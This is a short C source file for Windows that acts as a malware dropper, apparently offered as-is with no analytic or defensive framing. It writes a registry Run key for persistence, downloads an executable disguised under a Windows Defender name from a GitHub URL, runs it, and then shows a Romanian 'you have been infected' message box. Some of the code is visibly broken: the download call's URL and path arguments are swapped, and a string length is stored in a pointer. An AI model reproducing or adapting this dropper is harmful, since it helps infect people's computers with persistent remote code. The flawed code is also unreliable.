#include <windows.h>
#include <stdio.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

int main()
{
    HKEY hKey;

    RegCreateKeyA(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\0"),&hKey);

    const char* path = "C:\\Program Files\\WindowsDefender1.exe";
    const char* size = strlen(path);

    RegSetValueExA(hKey,"WindowsApp",0,REG_SZ,path,size);
    RegCloseKey(hKey);

    const char* file = "https://github.com/cheffloppa1/Powershell1/raw/refs/heads/main/WindowsDefender1.exe";

    URLDownloadToFileA(NULL,path,file,0,NULL);
    ShellExecuteA(NULL,"open",path,NULL,NULL,SW_NORMAL);


MessageBox(0,"Virusat","Ai fost Virusat",1);
return 0;
}